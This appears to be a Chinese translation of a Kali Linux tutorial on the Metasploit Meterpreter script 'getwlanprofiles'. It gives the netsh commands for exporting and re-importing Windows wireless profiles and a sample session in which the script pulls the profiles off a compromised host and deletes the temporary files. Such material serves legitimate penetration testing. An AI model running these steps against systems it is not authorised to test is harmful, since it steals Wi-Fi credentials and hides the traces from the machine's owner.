# metasploit getwlanprofiles–从 Windows 客户端下载无线配置文件的简单脚本

> 原文：<https://kalilinuxtutorials.com/metasploit-getwlanprofiles-simple-script/>

Metasploit getwlanprofiles 是一个 Meterpreter 脚本，当它在 Windows 7 或 Vista 系统上运行时，将提取并下载所有由 Windows 客户设置的无线配置文件，即不是由外部客户应用程序设置的。

它通过使用以下命令将所有配置文件转储到当前的%TEMP%目录来实现这一点

```
netsh wlan export profile folder=%TEMP%
```

此时，对于输出的每一行，找到配置文件的文件名并下载它。然后从索引中删除该记录。

#### **也读作[win pirate——自动化粘滞键 Hack](http://kalilinuxtutorials.com/winpirate-automated-sticky-keys-hack/)**

这些配置文件存储在**. ms F3/logs/scripts/WLAN _ profiles/**目录中。

要重用这些配置文件，可以使用以下命令将它们导入到另一个 Windows 框中

```
netsh wlan add profile filename="the_filename.xml"
```

测试时发现的一个问题是，你是否有一个外部的 wifi 卡，并在那时设置配置文件驱逐卡。netsh 脚本将无法再访问这些配置文件。当卡重新插入时，配置文件返回。在任何情况下，都有一种方法可以访问它们，但是 Metasploit getwlanprofiles 不能做到这一点。

## **Metasploit getwlanprofiles 用法**

只需解压缩脚本并将其移动到 meterpreter/scripts 目录。同时最好删除文件名中的版本号。

运行 Metasploit 时，getwlanprofiles 应如下所示:

```
meterpreter > run getwlanprofiles 
[*] Running Windows Wlan Profile Downloader Meterpreter Script
[*] New session on 192.168.0.80:53831...
[*] Running export command - netsh wlan export profile folder=C:\Users\robin\AppData\Local\Temp
[*] Downloading profile wpa_profile to /home/robin/.msf3/logs/scripts/wlan_profiles/VISTA-DOMAIN_20110110.5030/wpa_profile.xml
[*]     Deleting file C:\Users\robin\AppData\Local\Temp\Wireless Network Connection 2-wpa.xml
[*] Downloading profile thisiswep to /home/robin/.msf3/logs/scripts/wlan_profiles/VISTA-DOMAIN_20110110.5030/thisiswep.xml
[*]     Deleting file C:\Users\robin\AppData\Local\Temp\Wireless Network Connection 2-thisiswep.xml
[*] Downloading profile eap to /home/robin/.msf3/logs/scripts/wlan_profiles/VISTA-DOMAIN_20110110.5030/eap.xml
[*]     Deleting file C:\Users\robin\AppData\Local\Temp\Wireless Network Connection 2-this is it.xml
[*] Found and extracted 3 profiles
[*] Done!
```

[![](img/a51de913dc60eee505c4a68651ee8e4d.png)](https://digi.ninja/metasploit/getwlanprofiles.php)